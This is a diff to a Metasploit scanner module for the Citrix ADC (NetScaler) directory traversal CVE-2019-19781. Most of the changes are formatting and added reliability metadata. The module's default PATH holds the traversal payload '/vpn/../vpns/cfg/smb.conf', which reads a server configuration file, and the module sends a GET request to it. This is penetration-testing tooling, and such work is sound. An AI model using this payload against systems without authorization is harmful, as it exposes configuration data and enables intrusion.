@@ -10,34 +10,40 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Citrix ADC (NetScaler) Directory Traversal Scanner',
-      'Description'    => %{
-        This module exploits a directory traversal vulnerability (CVE-2019-19781) within Citrix ADC
-        (NetScaler). It requests the smb.conf file located in the /vpns/cfg directory by issuing the request
-        /vpn/../vpns/cfg/smb.conf. It then checks if the server is vulnerable by looking for the presence of
-        a "[global]" directive in smb.conf, which this file should always contain.
-      },
-      'Author'         => [
-        'Mikhail Klyuchnikov', # Discovery
-        'Erik Wynter',         # Module (@wyntererik)
-        'altonjx'              # Module (@altonjx)
-      ],
-      'References'     => [
-        ['CVE', '2019-19781'],
-        ['URL', 'https://web.archive.org/web/20200111095223/https://support.citrix.com/article/CTX267027/'],
-        ['URL', 'https://swarm.ptsecurity.com/remote-code-execution-in-citrix-adc/']
-      ],
-      'DisclosureDate' => '2019-12-17',
-      'License'        => MSF_LICENSE,
-      'Notes'          => {
-        'AKA'          => ['Shitrix']
-      }
-    ))
+    super(
+      update_info(
+        info,
+        'Name' => 'Citrix ADC (NetScaler) Directory Traversal Scanner',
+        'Description' => %q{
+          This module exploits a directory traversal vulnerability (CVE-2019-19781) within Citrix ADC
+          (NetScaler). It requests the smb.conf file located in the /vpns/cfg directory by issuing the request
+          /vpn/../vpns/cfg/smb.conf. It then checks if the server is vulnerable by looking for the presence of
+          a "[global]" directive in smb.conf, which this file should always contain.
+        },
+        'Author' => [
+          'Mikhail Klyuchnikov', # Discovery
+          'Erik Wynter',         # Module (@wyntererik)
+          'altonjx'              # Module (@altonjx)
+        ],
+        'References' => [
+          ['CVE', '2019-19781'],
+          ['URL', 'https://web.archive.org/web/20200111095223/https://support.citrix.com/article/CTX267027/'],
+          ['URL', 'https://swarm.ptsecurity.com/remote-code-execution-in-citrix-adc/']
+        ],
+        'DisclosureDate' => '2019-12-17',
+        'License' => MSF_LICENSE,
+        'Notes' => {
+          'AKA' => ['Shitrix'],
+          'Stability' => UNKNOWN_STABILITY,
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options([
       OptString.new('TARGETURI', [true, 'Base path', '/']),
-      OptString.new('PATH',      [true, 'Traversal path', '/vpn/../vpns/cfg/smb.conf'])
+      OptString.new('PATH', [true, 'Traversal path', '/vpn/../vpns/cfg/smb.conf'])
     ])
   end
 
@@ -46,7 +52,7 @@ class MetasploitModule < Msf::Auxiliary
 
     res = send_request_cgi(
       'method' => 'GET',
-      'uri'    =>  turi
+      'uri' => turi
     )
 
     unless res
